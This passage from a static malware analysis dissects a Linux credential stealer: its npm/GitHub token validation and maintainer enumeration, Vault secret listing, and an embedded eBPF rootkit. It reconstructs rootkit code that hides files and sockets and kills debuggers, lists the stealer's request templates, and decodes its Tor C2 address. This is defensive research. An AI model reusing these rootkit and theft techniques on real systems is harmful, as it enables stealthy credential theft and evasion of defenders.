The scope is narrower than "browser theft" suggests, and worth stating precisely. It pulls the `v10` and `v11` `encrypted_value` blobs out of the `Cookies` databases and nothing else from the browser profile, and even that is not a broad dump. The only two `SELECT ... FROM cookies` statements in the binary are host-filtered: one for Slack's `d` session cookie (`WHERE name = 'd' AND host_key LIKE '%.slack.com' ... LIMIT 1`) and one for Teams (`host_key LIKE '%teams.microsoft.com' ... LIMIT 30`). There is no unfiltered cookie read, no Firefox `moz_cookies`, and no reference to `Login Data` (saved passwords) or `Local State` (the v20 app-bound encryption key) anywhere in either binary. So saved passwords are untouched, the newer v20 app-bound cookies, whose key the operator could not decrypt off-host without `Local State`, are effectively out of reach, and the cookie theft is two named session cookies rather than the whole jar. What it takes is enough to ride an authenticated Slack or Teams session, but it is not the saved-password grab that some stealers do. The narrow scope is itself a negative control: the saved-password and Firefox artifacts a broad stealer would name are byte-absent from both binaries.

```
# what it does NOT read (negative control, both binaries)
$ for s in 'Login Data' 'Local State' moz_cookies logins.json key4.db; do
    printf '%-12s deps=%s js=%s\n' "$s" "$(strings deps|grep -ciF "$s")" "$(strings jsdigest_deps.bin|grep -ciF "$s")"
  done
Login Data   deps=0 js=0     # Chromium saved passwords -- not read
Local State  deps=0 js=0     # the v20 app-bound key -- so v20 cookies stay encrypted off-host
moz_cookies  deps=0 js=0     # Firefox cookies -- not targeted
logins.json  deps=0 js=0
key4.db      deps=0 js=0
```

I leaned on that claim hard enough to attack it. The off-host-decryption conclusion only holds if the binary cannot decrypt locally, so I ran the key-derivation tokens through a battery of negative-control lenses in both binaries: a contiguous case-insensitive search, the common static-obfuscation encodings (base64, hex, UTF-16LE, byte-reversed), an XOR pass under each binary's own 32-byte onion key at all 32 phase alignments, and a single-byte XOR sweep over all 255 keys. There is nowhere for a compressed copy to hide either, since unlike the wallet the stealer carries zero inflatable zlib streams. `saltysalt`, `peanuts`, `pbkdf2`, `os_crypt`, `Safe Storage`, and the Linux keyring names (`gnome-keyring`, `libsecret`, `kwallet`) come back zero under every lens in both samples. The plain contiguous lens alone:

```
$ for s in saltysalt peanuts pbkdf2 os_crypt 'Safe Storage' gnome-keyring libsecret kwallet; do
    printf '%-14s deps=%s js=%s\n' "$s" "$(strings deps|grep -ciF "$s")" "$(strings jsdigest_deps.bin|grep -ciF "$s")"
  done
saltysalt      deps=0 js=0
peanuts        deps=0 js=0
pbkdf2         deps=0 js=0
os_crypt       deps=0 js=0
Safe Storage   deps=0 js=0
gnome-keyring  deps=0 js=0
libsecret      deps=0 js=0
kwallet        deps=0 js=0
```

The only non-zero anywhere was the three-character token `v20` under the XOR sweeps, which is statistical noise: a three-byte string matches by chance dozens of times across the swept bytes, and it scored zero contiguous, so it is not actually present. The first-principles close is what makes this conclusive rather than suggestive. Linux Chromium `v10`/`v11` cookies decrypt with AES-128-CBC keyed by PBKDF2-SHA1 over the literal string `saltysalt`. With `saltysalt` and `pbkdf2` provably absent under every lens, and the only `AES_128_CBC` in the binary being rustls cipher-suite names (`aes_128_cbc` lowercase appears zero times, and the uppercase form is four substrings, `TLS_ECDHE_{RSA,ECDSA}_WITH_AES_128_CBC_SHA` and the two `_SHA256` variants, all packed into one `.rodata` line, so `grep -c` returns `1` and `grep -o | wc -l` returns `4`), local decryption is not merely unevidenced, it is impossible for this code. The same battery puts OpenAI and ChatGPT, and every other AI-vendor host I tested (Anthropic, Google, Hugging Face, Mistral, Cohere, and the rest), at zero in both binaries, which is why I keep the AI-credential claim to what is actually there: the `codex:` and `claude:` loot labels and the generic environment-and-history sweep that scoops up an `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` with no vendor string wired into the binary at all.

This differs from [Whanos](https://github.com/Whanos)'s wave-1 report, which lists OpenAI/ChatGPT token theft. In the two binaries I hold, `api.openai.com`, `openai`, and `chatgpt` are byte-absent, and the AI targets show up instead as the `codex:` and `claude:` loot labels above. The most likely explanation is a different build, or a target string assembled at runtime. I describe what is in these two samples, not the build they reversed.

## the part that makes it a worm {#supply-chain-pivot}

Most stealers grab and exfiltrate and that is the end of the story. This one has a second job that I find more alarming than the file theft, because it is how the campaign feeds itself.

The moment it has your tokens, it validates them and maps your publishing surface:

The request templates are sitting in `.rodata` as plain strings, which `strings` reads straight out:

```
$ strings deps | grep -E 'GET /user/repos|GET /-/whoami|GET .*v1/search.*maintainer' | LC_ALL=C sort
#GET /-/v1/search?text=maintainer%3A
GET /-/whoami HTTP/1.1
PGET /user/repos?sort=stars&direction=desc&per_page=3&type=owner HTTP/1.1
```

The leading `#` and `P` are spillover bytes from the preceding `.rodata` literal (the same artifact as the GPG argline's `9 ` prefix later), and `strings` stops each line at the `\r\n`, so the `Host:` values and the username are separate strings filled in at request time. The `maintainer%3A` (`maintainer:`) template ends exactly where the username goes. The `Authorization: Bearer` token is not in the binary. It is read from the victim's `gh/hosts.yml` and `.npmrc` at runtime and pasted into the header. The full GitHub template also sets two headers built to blend in, `User-Agent: git/2.39.0` and `Accept: application/vnd.github+json`. There is no git library in the binary that would emit that user-agent on its own, so the `git/2.39.0` is a deliberate masquerade: the token-validation traffic reads on the wire like an ordinary `git` fetch over HTTPS rather than a scraper hammering the API.

```
$ strings deps | grep -cF 'git/2.39.0'      # the spoofed UA, present
2
$ strings deps | grep -ciF 'libgit2'        # but no git library to emit it
0
$ strings deps | grep -ciF 'git_repository'
0
```

Read that npm search query again. `maintainer:`. It is enumerating the packages you maintain. If you are a developer with a valid npm or GitHub token in your environment, this malware finds out which popular packages you can publish to, and hands that list back to the operator. The designed next step is for the next wave to seed itself through your packages, under your name, with your credentials: steal a maintainer, publish through the maintainer, steal the next maintainer.

One honesty note, because it changes how alarmed you should be. I observed the recon half of that loop directly (the token validation and the `maintainer:` enumeration are in the TLS capture below). I did not observe the republish half, and as of this writing no public source has shown the stolen tokens actually being used to push a wave under a real victim's identity. Both observed waves came from fresh attacker-controlled accounts adopting orphans, not from hijacked maintainers. So this is a proven capability with its recon stage captured, not a confirmed self-propagation. That distinction matters: it is the difference between "this can frame you" and "this framed someone."

These are not reconstructed from the binary. They are the requests themselves, read in cleartext at a transparent TLS interception point. I redirect the guest's egress to a local sink that, for each connection, peeks the SNI out of the ClientHello and presents a leaf certificate minted on the fly for that exact host.

Why the stealer accepts that leaf is worth getting right, because the obvious guess, that it trusts a CA I planted in the system store, is not what happens. The TLS stack is `rustls` over `ring`, and the stealer ships a no-op certificate verifier. The binary carries a `NoCertVerifier` type and, tellingly, not one of the strings a verifying client needs: no `rustls-native-certs`, no `webpki`, no `ca-certificates.crt`, no `SSL_CERT_FILE`. So it negotiates TLS for confidentiality and to look ordinary on the wire, then accepts whatever certificate it is handed without authenticating it. A sinkhole presenting a self-signed leaf decrypts cleanly because the malware never checks. I do still install a throwaway CA in the guest, but that is for the clients that actually verify (the Node proxy, `curl`). The Rust stealer does not need it.

```
$ strings deps | grep -cF NoCertVerifier        # custom no-op cert verifier: present
1
$ strings deps | grep -ciE 'rustls-native-certs|webpki|ca-certificates\.crt|SSL_CERT_FILE'
0                                               # none of the strings a verifying client carries
$ strings deps | grep -cF docs.rs/rustls        # rustls itself: present (so TLS is real, the check is not)
1
```

```bash
# transparent sink: per connection, mint and present a leaf for the requested SNI
sni=$(peek_client_hello_sni "$conn")
openssl req  -newkey rsa:2048 -nodes -keyout "$sni.key" -out "$sni.csr" -subj "/CN=$sni"
openssl x509 -req -in "$sni.csr" -CA ca.crt -CAkey ca.key -days 2 \
        -extfile <(printf 'subjectAltName=DNS:%s' "$sni") -out "$sni.crt"
# wrap the socket with $sni.crt and read the cleartext request. the stealer does not verify, so any leaf works.
```

One honesty note on that mechanism, because it is an inference from the binary and not yet a control. The clean test is to re-fire the sink with no CA installed anywhere: the `NoCertVerifier` reading predicts the stealer still decrypts, since it never validated, where a client that did verify would drop the connection with a TLS alert. The static evidence (a `NoCertVerifier` type, zero root-store or `webpki` strings) already points one way. That one no-CA run is what would close it, and I am flagging it as a control I have not run rather than dressing the inference up as proven.

The home directory it harvested was seeded with canary tokens (`gho_HONEYCANARY…`, `npm_HONEYCANARY…`) that it used without ever knowing they were fake. Here is the actual `c2_capture.log` from `vmtest_1781526796`, lightly trimmed:

```
2026-06-15T12:33:38  TLS sni api.github.com       REQ GET /user HTTP/1.1
                       hdr Host: api.github.com
                       hdr Authorization: Bearer gho_HONEYCANARYghTokenNOTREAL000000000   <- validate GitHub token
2026-06-15T12:33:39  TLS sni registry.npmjs.org   REQ GET /-/whoami HTTP/1.1
                       hdr Host: registry.npmjs.org
                       hdr Authorization: Bearer npm_HONEYCANARYnpmTokenNOTREAL0000000     <- validate npm token
2026-06-15T12:34:03  TLS sni api.github.com       REQ GET /user/repos?sort=stars&direction=desc&per_page=3&type=owner HTTP/1.1
                       hdr Authorization: Bearer gho_HONEYCANARYghTokenNOTREAL000000000   <- map the victim's top repos
2026-06-15T12:34:04  TLS sni registry.npmjs.org   REQ GET /-/v1/search?text=maintainer%3Avictim&size=3 HTTP/1.1
                       hdr Host: registry.npmjs.org                                        <- find packages the victim maintains
```

The malware validated both canary tokens (`GET /user`, `GET /-/whoami`), then immediately enumerated what they could publish to (`/user/repos?sort=stars`, `/-/v1/search?text=maintainer:…`). The `maintainer%3Avictim` is the lab username the malware substituted into the query. That search is the worm's targeting step happening in real time: it asks npm "which packages can this account publish to," gets the answer, and hands it back to the operator.

The same collection routine (decompiled at `fcn.00156031`) does the matching thing to Microsoft identity. It takes the stolen Teams `skypeToken` and runs a Microsoft Graph beta sweep against `authsvc.teams.microsoft.com`, profiling not just the session but the tenant:

```
GET /beta/me/account
GET /beta/teams
GET /beta/users/tenants
  parses: displayName, userPrincipalName, jobTitle, tenantId, isAdminUser
```

`isAdminUser` is the field that matters. The stealer is not just grabbing a session, it is checking whether the session belongs to a tenant admin. That is targeting intelligence, the same instinct as the npm `maintainer:` query: find the high-value accounts to reuse next.

## it does not just read files, it interrogates the host {#active-enum}

Validating your tokens is the outward-facing half of the theft. The other half points inward, at the box it is already running on, and it goes well past reading files off disk. The stealer is not passive. It actively pokes at infrastructure it finds.

- **Vault.** It reads `/.vault-token`, then a dedicated process opens nine TCP connections to `127.0.0.1:8200` and talks the Vault API with an `X-Vault-Token` header set to the stolen token. It is not just stealing the token file, it is enumerating the running Vault's secrets. Captured during detonation as two full rounds of nine list calls, eighteen requests, which reads as two goroutines racing the same nine paths:

  ```
  GET /v1/sys/mounts                       (list every mount)
  GET /v1/secret/metadata/?list=true       GET /v1/secret/?list=true        (KV v2 / v1)
  GET /v1/kv/metadata/?list=true           GET /v1/kv/?list=true
  GET /v1/cubbyhole/metadata/?list=true    GET /v1/cubbyhole/?list=true
  GET /v1/secret-v2/metadata/?list=true    GET /v1/secret-v2/?list=true
  X-Vault-Token: <stolen from /.vault-token>
  # these are list calls only; on any hit the next step is GET /v1/<mount>/data/<path> to read the secret body
  ```
- **Kubernetes and cloud.** It reads `/etc/rancher/k3s/k3s.yaml`, the service-account token, enumerates Docker and Podman, looks for `.pypirc`.
- **Crypto wallet seeds.** It looks for `~/seed.txt`, the kind of plaintext mnemonic file people leave in their home directory. Fitting target for a campaign whose second stage is a wallet drainer.
- **Every process on the box.** It walks `/proc/<pid>/environ` and `/proc/<pid>/cmdline` across running PIDs, scraping environment variables and command lines for credentials. Anything you passed to a process as an env var or on its command line is in scope.
- **Cron persistence recon.** In detonation it forks `crontab -u <user> -l` for every user it found in `/etc/passwd`, walking each `PATH` directory to locate the binary, then exits. It is mapping existing scheduled-task footholds across all accounts, not just the one it is running as.
- **GPG.** This one I almost missed because it was not in my pre-filtered strings dump. At file offset `0x29c99` in the js-digest binary sits the GPG argline `--batch --no-tty --list-keys --with-colons --fingerprint` (`strings` prints a stray `9 ` ahead of it, two spillover bytes from the prior literal, so the argline proper begins at `0x29c9b`). That is a machine-parseable dump of the victim's public keyring. Dump the strings with offsets and the adjacency tells the story:

```
$ strings -n 6 -t x jsdigest_deps.bin | grep -iE "list-keys|vault-token|\.vault-token"
  29c99 9 --batch --no-tty --list-keys --with-colons --fingerprint
  29cd5 X-Vault-Token:
  2c537 /.vault-token
```

The GPG argline at `0x29c99` and the Vault API header `X-Vault-Token:` at `0x29cd5` are sixty bytes apart in the same `.rodata` cluster. They are part of the same harvest routine. To be precise about what GPG enumeration does not do: there is no `--list-secret-keys`, no `--export-secret`, no `GNUPGHOME`. It enumerates which identities you trust, it does not exfiltrate private keys. Still recon, just bounded recon.

The reason I almost missed GPG is not an accident, it is a deliberate pattern, and once you see it you see it everywhere in these binaries. The arguments are cleartext but the program name is not. `gpg`, `crontab`, `systemctl`, `which`, none of them appear as literals in either sample, while their argument strings (`--list-keys --with-colons`), the file paths they touch (`/etc/passwd`, `.ssh`, `.vault-token`), and the C2 paths (`/api/mt/`) all sit in `.rodata` in the clear:

```
$ for s in gpg crontab systemctl which '/api/mt/' /etc/passwd; do
    printf '%-12s %s\n' "$s" "$(strings deps | grep -cF "$s")"; done
gpg          0          # program names: assembled at runtime
crontab      0
systemctl    0
which        0
/api/mt/     3          # paths and args: cleartext
/etc/passwd  1
```

The obfuscation is concentrated precisely on the process-execution surface, the exact thing a `strings`-and-YARA first pass greps for to decide what a binary runs. Hide the verbs, leave the nouns, and a shallow triage reads it as a file-reader rather than something that shells out to `gpg` and `crontab`. It is why the GPG capability is invisible to a rule looking for the string `gpg`, and why I only found it by reading the argument cluster.

## the eBPF rootkit {#ebpf}

Everything to this point runs as your user, and so does the stealer itself. The next component is different: it only arms with root, so it is the escalation payoff rather than the baseline. When it does get privileges, it stops asking the kernel questions and starts editing the kernel's answers. The `aya`/`libbpf` crates were not decoration. The annotated BPF-C source survives in the binary strings, at the build path `/cloud/scales/agent/../ebpf/scales.bpf.c`. Hold onto that `/cloud/` prefix, it comes back later. This is a kernel-resident rootkit and traffic sniffer, and it is the reason static-only analysis is the safe way to handle this sample.

Two things to pin down first, because eBPF trips people up and this campaign has two separate binaries that are easy to confuse. What eBPF is: a Linux kernel feature that lets you load small, sandboxed programs into the kernel to run on events like syscalls or network packets. It is meant for tracing and observability, the same machinery behind tools like `bpftrace` and Cilium, but because those programs run inside the kernel and sit directly on the syscall path, a hostile one can change what userspace is allowed to see. That is the whole difference from a classic rootkit: it does not patch your files or swap out your `ls`, it edits the kernel's answers on the way out to userspace. And which binary carries it: the rootkit is inside the **stage-one `deps` stealer**, the Rust binary the AUR and npm chain drops and runs first. It is **not** in the second-stage `monero-wallet-gui` the stealer later pulls from the Tor C2. That one is the wallet drainer, and its malice lives in QML. One binary (the stealer) carries the rootkit, a different binary (the wallet it fetches) carries the drainer.

The stealer carries the compiled BPF object as an embedded blob, at file offset `0x324f9` in `deps` and `0x37d91` in `js-digest`, byte-identical between them, and absent entirely from the second-stage wallet. Pulled out and inspected on its own, it is a normal eBPF relocatable, built with debug info, which is exactly why the source reconstructs so cleanly:

```
$ file ebpf_rootkit.o
ebpf_rootkit.o: ELF 64-bit LSB relocatable, eBPF, version 1 (SYSV), with debug_info, not stripped
```

The section names in that object are the attach points. Each `tp/...` section is one tracepoint program, so listing the sections is listing the entire hook set the rootkit installs:

```
$ readelf -SW ebpf_rootkit.o | grep -oE 'tp/[a-z_/0-9]+' | sort -u
tp/sched/sched_process_exec
tp/syscalls/sys_enter_close
tp/syscalls/sys_enter_getdents64
tp/syscalls/sys_enter_openat
tp/syscalls/sys_enter_ptrace
tp/syscalls/sys_enter_read
tp/syscalls/sys_enter_recvmsg
tp/syscalls/sys_enter_socket
tp/syscalls/sys_exit_getdents64
tp/syscalls/sys_exit_openat
tp/syscalls/sys_exit_read
tp/syscalls/sys_exit_recvmsg
tp/syscalls/sys_exit_socket
```

Because the object kept its symbol table, the program inventory reads straight out of it: eighteen `FUNC` symbols, the thirteen tracepoint programs plus five helper subroutines, and the helper names are self-documenting:

```
$ readelf -sW ebpf.o | awk '$4=="FUNC"{print $8}' | wc -l
18
$ readelf -sW ebpf.o | awk '$4=="FUNC"{print $8}' | grep -vE '_(getdents|ptrace|recvmsg|socket|openat|read|close|exec)'
walk_dirent       # splice hidden entries out of a getdents buffer
name_to_pid       # resolve a process name to the PID set the hide-lists key on
scan_net_byte     # find the malware's own lines in a /proc/net/tcp read
zero_net_tail     # blank them (the netstat / cat path)
walk_nlmsg        # drop sock_diag records from a NETLINK reply (the ss path)
```

There is also a `.maps` section and a `license` section, and that license is load-bearing, not boilerplate: the two primitives this rootkit runs on, `bpf_probe_write_user` and `bpf_send_signal`, are GPL-only helpers, so the object must declare `GPL` or the kernel verifier refuses to load it. The section is exactly that, four bytes:

```
$ readelf -x license ebpf_rootkit.o
Hex dump of section 'license':
  0x00000000 47504c00                            GPL.
```

Map the tracepoints to behavior:

```mermaid
flowchart LR
  A1["ls / readdir"] --> B1["tp: getdents64<br/>enter + exit"] --> C1["splice hidden<br/>dirents out"]
  A2["any debugger"] --> B2["tp: ptrace enter"] --> C2["bpf_send_signal(9)<br/>SIGKILL the tracer"]
  A3["cat /proc/net/tcp"] --> B3["tp: openat + read + close"] --> C3["zero the socket lines<br/>(text path)"]
  A4["ss / netstat (NETLINK)"] --> B4["tp: socket + recvmsg"] --> C4["NLMSG_NOOP the<br/>sock_diag replies"]
  A5["every exec"] --> B5["tp: sched_process_exec"] --> C5["re-hide matching<br/>processes"]
  class A1,A2,A3,A4,A5 stock;
  class B1,B2,B3,B4,B5 inj;
  class C1,C2,C3,C4,C5 eff;
  classDef stock fill:#1b1c13,stroke:#2e3020,color:#c9c9b8;
  classDef inj fill:#14150e,stroke:#b3bd33,color:#e2ddcd;
  classDef eff fill:#14150e,stroke:#c97a6d,color:#e2ddcd;
```

Left column is the stock userspace action, middle is the rootkit's tracepoint that intercepts it, right is what userland ends up seeing.

It pins maps under `/sys/fs/bpf/` with names like `hidden_pids`, `hidden_inodes`, `hidden_names`, `net_fds`. The programs:

- **File and process hiding.** It tracepoints `sys_enter_getdents64` and `sys_exit_getdents64` and uses `bpf_probe_write_user` to splice directory entries out of the buffer the kernel already returned to userspace. The dirent record-merging logic (rewriting `d_reclen` to swallow the hidden entry) is right there. `ls`, `readdir`, anything using getdents, just does not see the malware's files.
- **Anti-debugging kill switch.** It tracepoints `sys_enter_ptrace`. If a process tries `PTRACE_ATTACH` or `PTRACE_SEIZE` against a hidden PID, the program calls `bpf_send_signal(9)`. SIGKILL. Your debugger dies the instant it touches the protected process. This is why you do not attach to this thing on a live box. You analyze it dead, on disk. One precision: this kill is the rootkit's, and the rootkit needs root. The userland stealer carries no anti-debug of its own, no `TracerPid` read, no `PTRACE_TRACEME`, no rdtsc or cpuid timing trap (the handful of `cpuid`/`rdtsc` in `.text` are `ring`'s CPU-feature probing for its crypto, not a sandbox check). So as an unprivileged user, with no eBPF loaded, you can attach to the stealer freely. The SIGKILL only arms once it has root and the programs are attached.
- **Connection hiding, on two separate paths.** Userland has two ways to list sockets, and the rootkit subverts both, with a named helper for each. The text path: a descriptor opened on `/proc/net/tcp` is tagged, and on `read()` the program walks the returned buffer (`scan_net_byte`) and blanks the lines describing the malware's own sockets (`zero_net_tail`), so `cat /proc/net/tcp` and `netstat` read clean. The binary path: `ss` does not read that file, it queries `sock_diag` over `NETLINK`, so a second program (`walk_nlmsg`) walks the netlink response and `NLMSG_NOOP`s out the diag records for those sockets. Hit it either way and the connection is invisible. The shared helper `name_to_pid` resolves a process name to the PID set the hide lists key on. Tools that read only one interface get only that interface censored, which is why a checker that crosses both (or reads neither, off clean media) is the way to catch it.
- **Self-protection.** `sched_process_exec` auto-adds matching processes to `hidden_pids`, so the rootkit re-hides itself across exec.

Because the object kept its debug info, the C reconstructs almost verbatim. Here are the three pieces that matter, lifted from the recovered source. The anti-debug kill switch:

```c
/* tp/syscalls/sys_enter_ptrace */
if (req != PTRACE_ATTACH && req != PTRACE_SEIZE)
    return 0;
if (pid_hidden(target))
    bpf_send_signal(9);              /* SIGKILL the tracer, in-kernel */
```

That C is a reconstruction from the debug info. The compiled bytecode it came from says the same thing with no room to argue, the request check, the hide-list lookup, then the kill (llvm-objdump's leading instruction offsets and opcode bytes are trimmed for width and the `;` notes are mine, the instruction text is verbatim):

```
$ llvm-objdump -d --section='tp/syscalls/sys_enter_ptrace' ebpf_rootkit.o
<enter_ptrace>:
  r2 = *(u64 *)(r1 + 0x10)     ; r2 = ptrace request (syscall arg0)
  if r2 == 0x4206 goto +0x1    ; PTRACE_SEIZE
  if r2 != 0x10   goto +0xa    ; else not PTRACE_ATTACH (0x10) -> exit
  r1 = *(u64 *)(r1 + 0x18)     ; r1 = target pid (syscall arg1), stashed to stack
  ...                          ; r1 = &hidden_pids, r2 = &pid
  call 0x1                     ; bpf_map_lookup_elem(hidden_pids, pid)
  if r0 == 0x0    goto +0x2    ; not on the hide list -> exit
  w1 = 0x9                     ; SIGKILL
  call 0x6d                    ; helper 109 = bpf_send_signal
  exit
```

`0x4206`/`0x10` are `PTRACE_SEIZE`/`PTRACE_ATTACH`, `0x9` is `SIGKILL`, and `0x6d` is helper 109, `bpf_send_signal`. The entire anti-debug primitive is those instructions: attach to a hidden PID, get killed in-kernel before your tracer call returns.

The getdents64 entry-splicer that hides files (it rewrites the previous entry's `d_reclen` to swallow the hidden record):

```c
/* tp/syscalls/sys_exit_getdents64 */
u16 merged = c->prev_rlen + rlen;
bpf_probe_write_user((void *)(c->buf + c->prev_off + 16), &merged, sizeof(merged));
c->prev_rlen = merged;
```

And the `/proc/net/tcp` line scrubber that hides connections, parsing field 9 (the inode) and zeroing any line whose inode is in `hidden_inodes`:

```c
/* tp/syscalls/sys_exit_read, on an fd opened against /proc/net/tcp */
if (c->field == 9 && ch >= '0' && ch <= '9')
    c->inode_val = c->inode_val * 10 + (ch - '0');
...
int hide = c->inode_val != 0 &&
           bpf_map_lookup_elem(&hidden_inodes, &c->inode_val) != NULL;
```

All of it is gated on root. Without privileges, eBPF load fails and these never arm. The stealer still runs and still steals as your user. The rootkit is the escalation payoff, not the baseline.

I did not have to guess where the BPF object lives. It is a second ELF embedded inside the stealer, so I scanned for the `\x7fELF` magic with `e_machine = 247` (BPF) and carved it out at the offset, read-only:

```
$ python3 carve_bpf.py deps jsdigest_deps.bin
deps              @ file 0x324f9 : ELF e_machine=247 (BPF), e_type=REL, 53 sections, 52776 B
                    sha256 = 3607de2597f8955f9a88f36ee43b64d3891b8ef536e99fa098e80169350f7b01
jsdigest_deps.bin @ file 0x37d91 : ELF e_machine=247 (BPF), 52776 B
                    sha256 = 3607de2597f8955f9a88f36ee43b64d3891b8ef536e99fa098e80169350f7b01   (BYTE-IDENTICAL to deps)
```

Same 52,776-byte object, same sha256 `3607de2597f8955f9a88f36ee43b64d3891b8ef536e99fa098e80169350f7b01`, embedded in both stealers at different offsets. One rootkit, two delivery wrappers. That inventory reads straight out of the section table and the BTF, no guessing:

```
$ readelf -SW ebpf_rootkit.o | grep -oE 'tp/[a-z_/0-9]+' | sort -u | wc -l   # tracepoint programs
13
$ readelf -SW ebpf_rootkit.o | grep -oE '\.maps|\.BTF|\.BTF\.ext|license' | sort -u
.BTF
.BTF.ext
.maps
license
$ readelf -p .BTF ebpf_rootkit.o | grep -oE 'hidden_(pids|names|inodes)|net_fds|recvmsg_temp|net_open_temp|net_read_temp|sock_open_temp|diag_fds' | sort -u
diag_fds
hidden_inodes
hidden_names
hidden_pids
net_fds
net_open_temp
net_read_temp
recvmsg_temp
sock_open_temp
```

So: 13 tracepoint programs, a `.maps` section, BTF and BTF.ext (the debug info that let the source reconstruct), and the `license` declaration. The pinned maps are `hidden_pids`, `hidden_names`, `hidden_inodes` (the hide lists), plus the scratch maps `recvmsg_temp`, `net_open_temp`, `net_fds`, `net_read_temp`, `sock_open_temp`, `diag_fds` that drive the connection-hiding state machine.

The mechanics are not only in the recovered source, they show up in the helper-call profile of the compiled programs. I walked the bytecode and counted every `call` (opcode `0x85`) across all fourteen code sections: seventy in all, and an independent disassembler agrees. Sixty-nine are kernel-helper calls (`src=0`) and one is a bpf-to-bpf call (`src=1`). The histogram of the helper calls reads as the rootkit's own behavior, one helper per job:

```
$ python3 bpf_helpers.py ebpf_rootkit.o
    14  #112  bpf_probe_read_user        read the kernel's buffer before tampering
    12  #1    bpf_map_lookup_elem        is this pid / inode / name on a hide list
    12  #14   bpf_get_current_pid_tgid   whose syscall is this
    10  #36   bpf_probe_write_user       rewrite it: splice dirents, zero /proc lines
     8  #2    bpf_map_update_elem        add to a hide list or scratch state
     7  #3    bpf_map_delete_elem        drop scratch state
     4  #181  bpf_loop                   bounded walk over a netlink or read buffer
     1  #16   bpf_get_current_comm       the name-based self-hide on exec
     1  #109  bpf_send_signal            the one SIGKILL, fired at a tracer
                                         69 helper calls, 9 distinct helpers (+1 bpf-to-bpf)
```

That column is the whole implant. The `probe_read_user` / `probe_write_user` pair is the read-the-kernel's-answer-then-overwrite-it pattern behind the dirent splicing and the `/proc/net/tcp` scrub. The lone `bpf_send_signal` is the single anti-debug kill. The four `bpf_loop`s are the bounded netlink and buffer walks.

The "nothing reaches the network or writes a file" half is a negative control, not an adjective. Those nine are the *entire* call set across all fourteen code sections, and the exfil-capable helpers a data-stealing eBPF program would actually need are absent. Walk every `call` opcode and check for them:

```
$ python3 bpf_helpers.py --exfil-check ebpf_rootkit.o
distinct helper IDs called : 1 2 3 14 16 36 109 112 181   (9, == the histogram; 69 calls + 1 bpf-to-bpf)
absent (the egress / persistence helpers a stealer would need):
  #25  bpf_perf_event_output    not called      <- no userspace send channel
  #130 bpf_ringbuf_output       not called      <- no ringbuf egress
  #9   bpf_skb_store_bytes      not called      <- no packet crafting
  #6   bpf_trace_printk         not called      <- not even a debug log path
  #51  bpf_sk_storage_get       not called
verdict: intercept-and-rewrite only; no helper that can send, craft, or persist data
```

So the rootkit physically cannot phone home or drop a file: it carries no helper that can. The exfil lives entirely in the userland Rust stealer. The kernel implant just keeps that traffic invisible. It is a pure intercept-and-rewrite implant, which is also why it leaves so little for userspace tooling to find.

## the onion C2 {#the-onion}

The rootkit spends all that effort hiding the malware's own sockets and killing anything that inspects them, which walks you straight into the question it is built to stop you asking: if the traffic is censored out of `ss` and `netstat`, where is this thing actually phoning home? That destination is the C2, and prying it out of the binary is the obvious next move. It turned out to be a Tor hidden service:

```
olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion
```

It is not in the binary as plaintext. It is XOR-encoded with a 32-byte key, and the key rotates per binary. The layout is the same in both stealers, the key bytes differ:

```mermaid
flowchart LR
  K["key[32] @ 0x1AA60<br/>f905b49b…7fcc3775"] --> X["decode @ 0x1209F2<br/>out[i] = ct[i] ^ key[i mod 32]"]
  C["ct[62] @ 0x2DA96<br/>9669c6f3…27f410a2"] --> X
  X --> O["olrh4mibs…onion"]
  class K,C data;
  class X inj;
  class O eff;
  classDef data fill:#1b1c13,stroke:#2e3020,color:#c9c9b8;
  classDef inj fill:#14150e,stroke:#b3bd33,color:#e2ddcd;
  classDef eff fill:#14150e,stroke:#c97a6d,color:#e2ddcd;
```

That layout is `deps`. The `js-digest` binary uses the identical scheme with its own key `beed4a6cfe0fdbf0a8ec78300155c273fabd838830d24aba74c6084f11137206` at `0x1CBA0` and ciphertext at `0x32BCB`, decoding to the same onion.

I reproduced the decode read-only against the `deps` binary on disk. No execution, just read the two byte ranges and XOR them:

```
$ python3 xor_onion.py deps.elf
key  @0x1AA60 : f905b49be743762b8cb7c1b8858d26cee156f59fd0055859c841499d7fcc3775
ct   @0x2DA96 (62 bytes)
loop : ct[i] ^ key[i % 32]
plain: olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion
```

Decode the other stealer with its own key and you land on the identical onion.

The decode loop itself is right there in `.text`, and disassembling it shows the same `ct[i] ^ key[i % 32]` byte by byte, pushing each decoded character into the onion string buffer (the `<-` notes are mine, everything left of them is `objdump`'s output):

```
$ objdump -d -M intel --start-address=0x1209f2 --stop-address=0x120a0d deps | grep -E '^ +[0-9a-f]+:' | sed -E 's/\t+/  /g; s/ +<[^>]+>//'
  1209f2:  e8 65 31 05 00         call   173b5c             <- fetch the next keystream byte (key[i % 32])
  1209f7:  48 85 c0               test   rax,rax
  1209fa:  74 11                  je     120a0d             <- ciphertext exhausted, onion assembled
  1209fc:  8a 0a                  mov    cl,BYTE PTR [rdx]   <- cl = ciphertext[i]
  1209fe:  32 08                  xor    cl,BYTE PTR [rax]   <- cl ^= keystream[i]  (the whole cipher, one byte)
  120a00:  0f b6 f1               movzx  esi,cl
  120a03:  4c 89 ff               mov    rdi,r15
  120a06:  e8 3f 85 02 00         call   148f4a             <- push the decoded byte into the onion String
  120a0b:  eb e2                  jmp    1209ef             <- loop to the next byte
```

The single `xor cl, byte [rax]` at `0x1209fe` is the entire cipher. A byte from the ciphertext XOR a byte from the 32-byte key, modulo 32, pushed into a `String`, in a loop. That is the whole obfuscation, and a sweep that models a 32-byte key recovers it in one pass.

Both scripts are in this post's repo. [`xor_onion.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/xor_onion.py) reads the two byte ranges at the known offsets and XORs them to print the onion. [`recover_onion.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/recover_onion.py) is the broader version: it sweeps the whole binary for a repeating-key XOR of a base32 `.onion` string against a 32-byte keystream, so it finds the construction even when you do not have the offsets in front of you yet. Point either one at `deps` or `js-digest` and the same onion falls out. Both are read-only, neither executes the sample.

